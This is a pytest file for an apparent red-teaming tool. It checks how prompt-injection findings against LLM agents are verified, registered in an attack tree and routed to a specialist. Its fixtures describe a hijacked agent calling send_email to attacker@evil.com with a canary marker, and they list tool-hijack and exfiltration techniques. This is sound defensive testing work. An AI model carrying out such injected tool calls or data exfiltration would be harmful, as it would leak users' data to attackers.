"""PI integration — independent verification of PI findings through the
EXISTING verifier, attack-tree registration, specialist routing."""

import json

import pytest

from redteam.pi import PIEngagement, PIEngagementConfig
from redteam.pi.verify import rederive_pi_verdict
from redteam.findings import FindingStore


# -- re-derivation unit tests ----------------------------------------------------------


def _spec(**over):
    base = {
        "canary": "PIC-" + "ab" * 8,
        "replies": ["transfer_funds done"],
        "later_replies": [],
        "tool_trace": [{"tool": "send_email", "arguments": {
            "to": "attacker@evil.com", "marker": "PIC-" + "ab" * 8},
            "session": "s1", "seq": 1}],
        "state_transition": {"ledger": [{
            "seq": 1, "tool": "send_email", "executed": True,
            "arguments": {"to": "attacker@evil.com",
                          "marker": "PIC-" + "ab" * 8},
            "session": "s1"}]},
        "primary_oracle": "pi.forbidden_tool", "target_tool": "send_email",
        "require_canary": True, "success_stage": "relayed",
        "negative_control": {"ran": True, "held": True},
        "benign_control": {"ran": True, "completed": True},
    }
    base.update(over)
    return base


def test_rederive_confirms_hijack_with_side_effect_and_controls():
    status, detail = rederive_pi_verdict(_spec())
    assert status == "confirmed"
    assert "side effect" in detail and "controls held" in detail


def test_rederive_falsifies_when_evidence_does_not_show_the_harm():
    status, _ = rederive_pi_verdict(_spec(tool_trace=[], state_transition={
        "ledger": []}))
    assert status == "falsified"


def test_rederive_falsifies_persisted_only_below_claimed_stage():
    spec = _spec(primary_oracle="pi.canary", success_stage="relayed",
                 replies=[], tool_trace=[], state_transition={"ledger": []},
                 later_replies=[f"earlier you saw {'PIC-' + 'ab' * 8}"])
    status, detail = rederive_pi_verdict(spec)
    assert status == "falsified" and "persisted" in detail


def test_rederive_confirms_persistence_when_that_is_the_claim():
    spec = _spec(primary_oracle="pi.canary", success_stage="persisted",
                 replies=[], tool_trace=[], state_transition={"ledger": []},
                 later_replies=[f"earlier you saw {'PIC-' + 'ab' * 8}"])
    assert rederive_pi_verdict(spec)[0] == "confirmed"


def test_rederive_blocks_on_missing_or_failed_controls():
    assert rederive_pi_verdict(_spec(negative_control={"ran": False}))[0] \
        == "not_reproducible"
    assert rederive_pi_verdict(_spec(negative_control={"ran": True,
                                                       "held": False}))[0] \
        == "not_reproducible"
    assert rederive_pi_verdict(_spec(benign_control={"ran": True,
                                                     "completed": False}))[0] \
        == "not_reproducible"
    assert rederive_pi_verdict(_spec(canary=""))[0] == "not_reproducible"


def test_rederive_hijack_blocked_by_executor_falsifies_the_claim():
    """A canary-bearing invocation the executor BLOCKED is an attempt, not a
    detonation — a success claim over it is falsified (the executor is target
    behavior, not an environment failure)."""
    spec = _spec(state_transition={"ledger": [{
        "seq": 1, "tool": "send_email", "executed": False, "blocked": True,
        "arguments": {"to": "attacker@evil.com",
                      "marker": "PIC-" + "ab" * 8}, "session": "s1"}]})
    status, detail = rederive_pi_verdict(spec)
    assert status == "falsified" and "blocked" in detail


# -- the full independent-verification loop ----------------------------------------------


def _tool_ctx(tmp_path):
    import datetime as _dt
    from redteam.config import Engagement, LlmConfig, SandboxConfig
    from redteam.knowledge import KnowledgeGraph
    from redteam.ratelimit import RateLimiter
    from redteam.scope import ScopeGuard
    from redteam.tools import ToolContext
    eng = Engagement(
        name="t", client="c", authorized_by="a", ticket="ref",
        starts=_dt.date.today() - _dt.timedelta(days=1),
        ends=_dt.date.today() + _dt.timedelta(days=1),
        allowed_hosts=("api.acme.example",), excluded_hosts=(),
        allowed_ports=(80, 443), allowed_schemes=("http", "https"),
        max_requests_per_second=100.0, max_total_requests=1000,
        allow_private_ranges=False, require_approval_for=(),
        llm=LlmConfig(), sandbox=SandboxConfig(), raw={},
    )
    resolver = lambda host, port: [(2, 1, 6, "", ("203.0.113.5", 0))]
    return ToolContext(
        scope=ScopeGuard(eng, resolver=resolver),
        limiter=RateLimiter(100, 1000),
        audit=type("A", (), {"record": lambda *a, **k: None})(),
        findings=FindingStore(tmp_path / "f.json"),
        approve=lambda a, d: True,
        sandbox=None,
        graph=KnowledgeGraph(tmp_path / "g.json"),
    )


def test_pi_finding_flows_to_independent_confirmation(tmp_path):
    """The complete proof-first loop for LLM01: engagement -> pending finding
    -> verify_finding_independently re-derives from raw evidence -> confirmed."""
    from redteam.tools.independent_verify import VerifyFindingIndependentlyTool
    ctx = _tool_ctx(tmp_path)
    eng = PIEngagement(PIEngagementConfig(
        engagement_id="verify-e2e", seed=5, defense_modes=("off",),
        technique_ids=["PI.B1"], findings_store=ctx.findings))
    eng.run()
    pending = [f for f in ctx.findings.all() if f.confidence == "pending_verification"]
    assert len(pending) == 1
    f = pending[0]
    assert f.check_type == "pi_oracle" and f.check_spec["canary"]

    out = VerifyFindingIndependentlyTool().run(ctx, finding_id=f.id)
    assert '"verdict": "confirmed"' in out
    assert ctx.findings.get(f.id).confidence == "confirmed"
    assert ctx.findings.get(f.id).independent_verdict == "confirmed"


def test_pi_finding_falsified_when_evidence_was_overclaimed(tmp_path):
    """An over-claiming runner cannot survive independent verification: the
    re-derivation reads the raw evidence, not the runner's verdict."""
    from redteam.tools.independent_verify import VerifyFindingIndependentlyTool
    ctx = _tool_ctx(tmp_path)
    eng = PIEngagement(PIEngagementConfig(
        engagement_id="verify-false", seed=5, defense_modes=("on",),
        technique_ids=["PI.B1"], findings_store=ctx.findings))
    eng.run()
    pending = [f for f in ctx.findings.all() if f.confidence == "pending_verification"]
    assert pending == []            # defended app: nothing succeeded, nothing filed
    # fabricate the over-claim: a pending pi_oracle finding whose raw evidence
    # shows NO invocation at all
    from redteam.findings import Finding
    f = Finding(title="fabricated PI", severity="high", target="app",
                summary="over-claim", check_type="pi_oracle",
                check_spec={"canary": "PIC-" + "cd" * 8, "replies": ["nothing"],
                            "tool_trace": [],
                            "state_transition": {"ledger": []},
                            "primary_oracle": "pi.forbidden_tool",
                            "target_tool": "send_email", "require_canary": True,
                            "success_stage": "relayed",
                            "negative_control": {"ran": True, "held": True},
                            "benign_control": {"ran": True, "completed": True}},
                confidence="pending_verification")
    ctx.findings.add(f)
    out = VerifyFindingIndependentlyTool().run(ctx, finding_id=f.id)
    assert '"verdict": "falsified"' in out
    assert ctx.findings.get(f.id).confidence == "falsified"


# -- attack tree registration (additive, chained-only) -----------------------------------


def test_attack_tree_knows_the_pi_arm_without_seeding_it():
    from redteam.attack_tree import TECHNIQUES, ENTRY_TECHNIQUES, technique_cost
    pi_ids = [t for t in TECHNIQUES if t.startswith("pi.")]
    assert set(pi_ids) == {"pi.direct", "pi.indirect", "pi.planflip",
                           "pi.tool.hijack", "pi.exfil"}
    assert not any(t.startswith("pi.") for t in ENTRY_TECHNIQUES)
    for pid in pi_ids:
        assert technique_cost(pid) > 0
    assert TECHNIQUES["pi.tool.hijack"].unlocks == ("data.exfil",)


def test_web_side_of_the_tree_is_untouched():
    """The 13 web techniques keep their exact ids, tactics and unlocks — the
    PI arm is purely additive."""
    from redteam.attack_tree import TECHNIQUES
    web = [t for t in TECHNIQUES if not t.startswith("pi.")]
    assert len(web) == 13
    assert TECHNIQUES["injection.sqli"].tactic == "initial-access"
    assert TECHNIQUES["access.idor"].unlocks == ("data.exfil",)
    assert set(TECHNIQUES["injection.sqli"].unlocks) == {"auth.bypass", "data.exfil"}


# -- specialist routing --------------------------------------------------------------------


def test_llm01_specialist_routes_pi_techniques():
    from redteam.specialists import profile_for, EXPLOIT
    p = profile_for("pi.tool.hijack")
    assert p.name == "llm01-prompt-injection"
    assert p is not EXPLOIT
    assert profile_for("pi.direct").name == "llm01-prompt-injection"
    # web routing untouched
    assert profile_for("injection.sqli").name != "llm01-prompt-injection"


def test_specialist_disable_switch_still_applies_to_llm01(monkeypatch):
    from redteam.specialists import profile_for, EXPLOIT
    monkeypatch.setenv("RED_CLASS_SPECIALISTS", "0")
    assert profile_for("pi.indirect") is EXPLOIT
